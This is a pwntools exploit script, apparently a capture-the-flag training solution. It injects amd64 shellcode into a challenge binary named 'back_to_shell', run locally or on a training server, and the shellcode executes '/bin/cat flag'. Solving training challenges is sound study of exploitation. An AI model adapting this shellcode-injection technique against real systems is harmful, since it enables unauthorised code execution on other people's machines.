from pwn import *

context.arch = "amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./back_to_shell")
        gdb.attach(c, """
        c
        """ )
        #wait for stdinput until I press enter
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./back_to_shell")

shellcode = """
    xor rdi, rdi
    push rdi
    mov rdi, 0x7461632f6e69622f
    push rdi
    mov rdi, rsp
    mov rsi, 0x0067616c66
    push rsi
    mov rsi, rsp
    xor rdx, rdx
    push rdx
    push rsi
    push rdi
    mov rsi, rsp
    mov rax, 0x3b
    syscall
"""

c.send(asm(shellcode))

c.interactive()
